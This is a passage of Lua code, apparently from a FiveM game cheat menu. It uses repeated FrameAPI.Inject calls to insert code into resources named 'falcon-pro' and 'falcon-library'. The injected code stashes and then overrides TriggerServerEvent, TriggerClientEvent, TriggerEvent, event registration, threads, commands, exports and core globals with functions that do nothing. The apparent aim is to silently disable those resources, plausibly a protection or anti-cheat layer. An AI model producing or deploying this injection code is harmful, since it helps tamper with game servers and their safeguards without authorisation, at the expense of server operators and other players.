_G.SendNUIMessage = function()
return
end
_G.AddEventHandler = function()
return
end
_G.RegisterNetEvent = function()
return
end
_G.io = function()
return
end
_G.json = function()
return
end
_G.os = function()
return
end
_G.table = function()
return
end
_G.math = function()
return
end
_G.type = function()
return
end
_G.getmetatable = function()
return
end
end
end)
]])

FrameAPI.Inject('falcon-pro', [[
if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
_G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
end
TriggerServerEvent = function(eventName, ...)
return
end
]])

FrameAPI.Inject('falcon-pro', [[
if not _G._ORIGINAL_TRIGGER_CLIENT_EVENT then
    _G._ORIGINAL_TRIGGER_CLIENT_EVENT = TriggerClientEvent
end

TriggerClientEvent = function(eventName, playerId, ...)
    return
end
]])

FrameAPI.Inject('falcon-pro', [[
if not _G._ORIGINAL_TRIGGER_EVENT then
    _G._ORIGINAL_TRIGGER_EVENT = TriggerEvent
end

TriggerEvent = function(eventName, ...)
    return
end
]])


FrameAPI.Inject('falcon-library', [[
TriggerEvent = function(...) return end
RegisterNetEvent = function(...) return end
AddEventHandler = function(...) return end
Citizen.CreateThread = function(...) return end
RegisterCommand = function(...) return end
exports = setmetatable({}, {
__index = function()
return function(...) return end
end
})
]])

FrameAPI.Inject('falcon-library', [[
if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
_G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
end
TriggerServerEvent = function(eventName, ...)
return
end
]])

FrameAPI.Inject('falcon-library', [[
if not _G._ORIGINAL_TRIGGER_CLIENT_EVENT then
    _G._ORIGINAL_TRIGGER_CLIENT_EVENT = TriggerClientEvent
end

TriggerClientEvent = function(eventName, playerId, ...)
    return
end
]])

FrameAPI.Inject('falcon-library', [[
if not _G._ORIGINAL_TRIGGER_EVENT then
    _G._ORIGINAL_TRIGGER_EVENT = TriggerEvent
end

TriggerEvent = function(eventName, ...)
    return
end
]])





























--NEXT MENU
